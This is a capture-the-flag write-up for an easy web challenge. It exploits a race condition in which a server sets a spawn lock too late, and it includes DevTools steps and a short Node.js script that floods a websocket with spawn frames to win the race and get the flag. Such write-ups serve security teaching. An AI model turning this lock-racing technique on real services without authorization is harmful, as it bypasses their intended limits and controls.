# Writeup: Waguri1

## Information

**Category:** Web
**Difficulty:** Easy 

## Description

The website has only one `SPAWN` button. When clicked, the browser sends a websocket message:

```json
{"type":"spawn"}
```

The server returns a random image and sound. The image spawns at a random position on the screen and does not disappear on subsequent spawns.

## Exploitation Idea

The server tries to block multiple concurrent `spawn` requests using a lock variable. However, the lock is set too late, after an asynchronous processing step. If many websocket frames `{"type":"spawn"}` are sent very quickly within the same connection, multiple requests can slip past the lock check before the lock is turned on.

When enough requests fall into the race window, the server returns the flag in a websocket frame:

```json
{
  "type": "spawned",
  "image": "/images/1.gif",
  "sound": "/sounds/4.mp3",
  "spawnId": 6,
  "race": "won",
  "flag": "LYKNCTF{r4c3_th3_sp4wn_l0ck}"
}
```

The `sound` value may vary since the sound is still randomized. What matters is the `race` and `flag` fields.

## Solving With DevTools

1. Open the challenge page.
2. Open DevTools.
3. Go to the `Network` tab.
4. Select the websocket connection using the `WS` filter.
5. Click the `SPAWN` button as fast as possible, many times.
6. Check the `Messages` or `Frames` panel.
7. If done fast enough, one response will have a `flag` field.

This method can be unreliable since it depends on clicking speed. A more reliable way is to use a websocket script.

## Script

```js
const WebSocket = require('ws');

const url = process.argv[2] || 'ws://localhost:3000';
const ws = new WebSocket(url);

ws.on('open', () => {
  for (let i = 0; i < 20; i += 1) {
    ws.send(JSON.stringify({ type: 'spawn' }));
  }
});

ws.on('message', (data) => {
  const message = JSON.parse(data.toString());

  if (message.flag) {
    console.log(message.flag);
    ws.close();
  }
});
```

Run:

```bash
npm install ws
node solve.js ws://localhost:3000
```

If running against the real domain, replace `ws://localhost:3000` with the challenge's websocket URL.
